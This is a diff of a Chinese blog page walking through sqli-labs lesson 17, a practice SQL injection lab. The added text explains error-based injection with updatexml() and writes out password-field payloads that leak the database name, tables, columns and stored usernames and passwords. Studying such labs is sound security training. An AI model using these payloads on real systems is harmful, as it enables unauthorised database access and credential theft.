@@ -10,17 +10,25 @@
   <meta name="description" content="lesson17：这一关不管我们在username上构造什么payload都无法篡改数据库。 我们查看源码： 1234567891011121314151617181920212223242526function check_input($value)	&amp;#123;	if(!empty($value))		&amp;#123;		&#x2F;&#x2F; truncation (see comments)		$value &#x3D;">
 <meta property="og:type" content="article">
 <meta property="og:title" content="lesson17-">
-<meta property="og:url" content="http://example.com/2021/01/31/17-/index.html">
+<meta property="og:url" content="http://example.com/2021/01/31/lesson17/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="lesson17：这一关不管我们在username上构造什么payload都无法篡改数据库。 我们查看源码： 1234567891011121314151617181920212223242526function check_input($value)	&amp;#123;	if(!empty($value))		&amp;#123;		&#x2F;&#x2F; truncation (see comments)		$value &#x3D;">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/2021/01/31/17-/1.png">
+<meta property="og:image" content="http://example.com/2021/01/31/lesson17/1.png">
+<meta property="og:image" content="http://example.com/2021/01/31/lesson17/2.png">
+<meta property="og:image" content="http://example.com/2021/01/31/lesson17/3.png">
+<meta property="og:image" content="http://example.com/2021/01/31/lesson17/4.png">
+<meta property="og:image" content="http://example.com/2021/01/31/lesson17/5.png">
+<meta property="og:image" content="http://example.com/2021/01/31/lesson17/6.png">
+<meta property="og:image" content="http://example.com/2021/01/31/lesson17/7.png">
+<meta property="og:image" content="http://example.com/2021/01/31/lesson17/8.png">
+<meta property="og:image" content="http://example.com/2021/01/31/lesson17/9.png">
 <meta property="article:published_time" content="2021-01-31T13:26:30.000Z">
-<meta property="article:modified_time" content="2021-02-01T12:31:54.088Z">
+<meta property="article:modified_time" content="2021-02-02T13:37:33.928Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="sqlilabs">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2021/01/31/17-/1.png">
+<meta name="twitter:image" content="http://example.com/2021/01/31/lesson17/1.png">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -69,9 +77,9 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main"><article id="post-17-" class="article article-type-post" itemscope itemprop="blogPost">
+        <section id="main"><article id="post-lesson17" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2021/01/31/17-/" class="article-date">
+    <a href="/2021/01/31/lesson17/" class="article-date">
   <time datetime="2021-01-31T13:26:30.000Z" itemprop="datePublished">2021-01-31</time>
 </a>
     
@@ -95,27 +103,60 @@
 <p>我们查看源码：</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function check_input($value)</span><br><span class="line">	&#123;</span><br><span class="line">	if(!empty($value))</span><br><span class="line">		&#123;</span><br><span class="line">		// truncation (see comments)</span><br><span class="line">		$value = substr($value,0,15);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		// Stripslashes if magic quotes enabled</span><br><span class="line">		if (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			$value = stripslashes($value);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		// Quote if not a number</span><br><span class="line">		if (!ctype_digit($value))</span><br><span class="line">			&#123;</span><br><span class="line">			$value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	else</span><br><span class="line">		&#123;</span><br><span class="line">		$value = intval($value);</span><br><span class="line">		&#125;</span><br><span class="line">	return $value;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
 
-<p>先认识一下陌生函数：</p>
-<p>1.get_magic_quotes_gpc()函数<br>get_magic_quotes_gpc()函数取得PHP环境配置的变量magic_quotes_gpc(GPC, Get/Post/Cookie)值。返回0表示本功能关闭，返回1表示本功能打开。</p>
+<h4 id="先认识一下陌生函数："><a href="#先认识一下陌生函数：" class="headerlink" title="先认识一下陌生函数："></a>先认识一下陌生函数：</h4><h5 id="1-get-magic-quotes-gpc-函数"><a href="#1-get-magic-quotes-gpc-函数" class="headerlink" title="1.get_magic_quotes_gpc()函数"></a>1.get_magic_quotes_gpc()函数</h5><p>get_magic_quotes_gpc()函数取得PHP环境配置的变量magic_quotes_gpc(GPC, Get/Post/Cookie)值。返回0表示本功能关闭，返回1表示本功能打开。</p>
 <p>注：开启magic_quotes_gpc=on之后，能实现addsIshes()和stripslashes()这两个函数的功能。在PHP4.0及以上的版本中，该选项默认情况下是开启的，所以在PHP4.0及以上的版本中，就算PHP程序中的参数没有进行过滤，PHP系统也会对每一个通过GET、POST、COOKIE方式传递的变量自动转换，换句话说，输入的注入攻击代码将会全部被转换，将给攻击者带来非常大的困难。</p>
-<p>2.addslashes()函数<br>addslashes()函数将输入数据中的预定义字符（单引号、双引号、反斜杠和NULL(空字符)）之前添加反斜杠\的字符串。</p>
-<p>3.stripslashes()函数</p>
-<p>stripslashes(string)函数删除由addslashes()函数添加的反斜杠。</p>
+<h5 id="2-addslashes-函数"><a href="#2-addslashes-函数" class="headerlink" title="2.addslashes()函数"></a>2.addslashes()函数</h5><p>addslashes()函数将输入数据中的预定义字符（单引号、双引号、反斜杠和NULL(空字符)）之前添加反斜杠\的字符串。</p>
+<h5 id="3-stripslashes-函数"><a href="#3-stripslashes-函数" class="headerlink" title="3.stripslashes()函数"></a>3.stripslashes()函数</h5><p>stripslashes(string)函数删除由addslashes()函数添加的反斜杠。</p>
 <p>注意：当magic_quotes_gpc打开时，所有的单引号、双引号、反斜杠和NULL(空字符)会自动转为含有反斜杠的溢出字符（PHP对所有的GET、POST和COOKIE数据自动运行addslashes()）。所以不应对已转义过的字符串使用addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数get_magic_quotes_gpc()进行检测。</p>
-<p>4.ctype_digit()函数<br>ctype_digit()函数检查字符串中每个字符是否都是十进制数字，若是则返回TRUE，否则返回FALSE。</p>
-<p>5.mysql_real_escape_string()函数</p>
-<p>转义 SQL 语句中使用的字符串中的特殊字符：<img src="/2021/01/31/17-/1.png" alt="1"></p>
+<h5 id="4-ctype-digit-函数"><a href="#4-ctype-digit-函数" class="headerlink" title="4.ctype_digit()函数"></a>4.ctype_digit()函数</h5><p>ctype_digit()函数检查字符串中每个字符是否都是十进制数字，若是则返回TRUE，否则返回FALSE。</p>
+<h5 id="5-mysql-real-escape-string-函数"><a href="#5-mysql-real-escape-string-函数" class="headerlink" title="5.mysql_real_escape_string()函数"></a>5.mysql_real_escape_string()函数</h5><p>转义 SQL 语句中使用的字符串中的特殊字符：<img src="/2021/01/31/lesson17/1.png" alt="1"></p>
 <p><strong>sp：</strong>怎么理解这个转义呢？举个例子，PHP把输入数据中的单引号转义了（单引号前加了个反斜杠）变成字符串一部分，那么输入数据代入数据库sql语句时，这个转义后的单引号就无法作为字符与数据库sql语句中本来存在的单引号合并，所以无法篡改sql语句。</p>
-<p>由于数据库中对输入的username一顿操作，那么从username下手肯定吃不了兜着走，所以我们观察源码：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">update</span>=<span class="string">&quot;UPDATE users SET password = &#x27;$passwd&#x27; WHERE username=&#x27;$row1&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p>我们观察源码：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$uname=check_input($_POST[&#x27;uname&#x27;]);  </span><br><span class="line"></span><br><span class="line">$passwd=$_POST[&#x27;passwd&#x27;];</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">$<span class="keyword">update</span>=<span class="string">&quot;UPDATE users SET password = &#x27;$passwd&#x27; WHERE username=&#x27;$row1&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
 
-<p>发现可以从password下手。</p>
+<p>由于数据库中对输入的username一顿操作，那么从username下手肯定吃不了兜着走，所以转变思路可以从password下手。</p>
 <p>输入username=root ；password=root’，页面报sql语法错误，确定注入点为：’  ;</p>
+<p><strong>！这里介绍一个注入方法：</strong></p>
+<h3 id="报错注入："><a href="#报错注入：" class="headerlink" title="报错注入："></a>报错注入：</h3><h5 id="A-常用函数："><a href="#A-常用函数：" class="headerlink" title="A.常用函数："></a>A.常用函数：</h5><h6 id="1-updatexml-函数："><a href="#1-updatexml-函数：" class="headerlink" title="1.updatexml()函数："></a>1.updatexml()函数：</h6><p>updatexml(xml_doc,xpath,new_value)函数有三个参数，分别是(xml_document, XPath_string, new_value)—-</p>
+<p>第一个参数：xml_document， String格式，为XML文档对象的名称；</p>
+<p>第二个参数：XPath_string (Xpath格式的字符串)；</p>
+<p>第三个参数：new_value， String格式，替换查找到的符合条件的数据；</p>
+<p>该函数的作用就是把xml文档中的指定字符串替换成新值。</p>
+<p><img src="/2021/01/31/lesson17/2.png" alt="2"></p>
+<h6 id="2-extractvalue-函数："><a href="#2-extractvalue-函数：" class="headerlink" title="2.extractvalue()函数："></a>2.extractvalue()函数：</h6><p>extractvalue(xml_doc, xpath)函数作用是从指定xml文档中查询指定的字符串。</p>
+<h5 id><a href="#" class="headerlink" title></a><img src="/2021/01/31/lesson17/3.png" alt="3"></h5><h5 id="B-报错注入原理："><a href="#B-报错注入原理：" class="headerlink" title="B.报错注入原理："></a>B.报错注入原理：</h5><p>参数xpath需要的是xpath格式的字符串，不是就会报错。</p>
+<p>当xpath路径语法错误时，就会报错。</p>
+<p>注：报错的长度是有一定限制的，不要构造过长的payload，否则后面的字符串会被截断。</p>
+<p>懂得了以上知识就可以开始注入了。因为两种函数的注入方法大相径庭，所以下面我就举updatexml为例解题。</p>
+<h3 id="爆库："><a href="#爆库：" class="headerlink" title="爆库："></a>爆库：</h3><p>输入：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=root</span><br><span class="line">password=(anything)&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;,(select database())),1)#</span></span><br></pre></td></tr></table></figure>
+
+<p>得：<img src="/2021/01/31/lesson17/4.png" alt="4"></p>
+<p>注：#字符是为了使xpath路径语法错误，也可以用别的字符代替。</p>
+<h3 id="爆表："><a href="#爆表：" class="headerlink" title="爆表："></a>爆表：</h3><p>输入：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=root</span><br><span class="line">password=&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)),1)#</span></span><br></pre></td></tr></table></figure>
+
+<p>得：<img src="/2021/01/31/lesson17/5.png" alt="5"></p>
+<h3 id="爆列："><a href="#爆列：" class="headerlink" title="爆列："></a>爆列：</h3><p>输入：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=root</span><br><span class="line">password=&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;)),1)#</span></span><br></pre></td></tr></table></figure>
+
+<p>得：<img src="/2021/01/31/lesson17/6.png" alt="6"></p>
+<h3 id="爆值："><a href="#爆值：" class="headerlink" title="爆值："></a>爆值：</h3><p>输入：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username=root</span><br><span class="line">password=&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;,(select * from (select concat_ws</span></span><br><span class="line">(&#x27; &#x27;,id,username,password) from users limit 0,1) x)),1)<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>得：<img src="/2021/01/31/lesson17/7.png" alt="7"></p>
+<h5 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h5><p>1.爆值的时候需要注意，不能直接用简单的<code>select concat(username)</code>，这样会引起报错：<img src="/2021/01/31/lesson17/8.png" alt="8"></p>
+<p>原因是：在同一个语句中，不能先查询表中的值再update这个表，可以先把查询出的值作为一个派生表，然后在这个派生表里面再次进行查询。</p>
+<p><img src="/2021/01/31/lesson17/9.png" alt="9"></p>
+<p>2.由于用户数据较多，且报错内容有长度限制，所以我们在注入是可以通过改变limit函数变量来控制</p>
+<p>回显内容。</p>
+<p><strong>sp：回顾一下字符串连接函数</strong></p>
+<p><strong>1.concat(str1,str2,…)——没有分隔符地连接字符串</strong><br><strong>2.concat_ws(‘separator’,str1,str2,…)——含有分隔符地连接字符串</strong><br><strong>3.group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据</strong></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/01/31/17-/" data-id="ckkmk037o0000i8vu8lfs0abu" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/01/31/lesson17/" data-id="ckko4t7iu0001c8vu5p0337b5" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li></ul>
@@ -126,11 +167,11 @@
     
 <nav id="article-nav">
   
-    <a href="/2021/02/01/blogk/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2021/02/01/lesson18-19/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Newer</strong>
       <div class="article-nav-title">
         
-          blogk
+          (no title)
         
       </div>
     </a>
@@ -189,11 +230,15 @@
       <ul>
         
           <li>
-            <a href="/2021/02/01/blogk/">blogk</a>
+            <a href="/2021/02/02/HPPT%E5%8D%8F%E8%AE%AE/">HPPT协议</a>
           </li>
         
           <li>
-            <a href="/2021/01/31/17-/">lesson17-</a>
+            <a href="/2021/02/01/lesson18-19/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2021/01/31/lesson17/">lesson17-</a>
           </li>
         
           <li>
@@ -202,10 +247,6 @@
         
           <li>
             <a href="/2021/01/27/2021-1%E6%9C%88web%E6%B8%97%E9%80%8F%E5%9F%B9%E8%AE%AD(1)/">2021.1月web渗透培训</a>
-          </li>
-        
-          <li>
-            <a href="/2021/01/27/2021-1%E6%9C%88web%E6%B8%97%E9%80%8F%E5%9F%B9%E8%AE%AD(2)/">2021-1月web渗透培训(2)</a>
           </li>
         
       </ul>
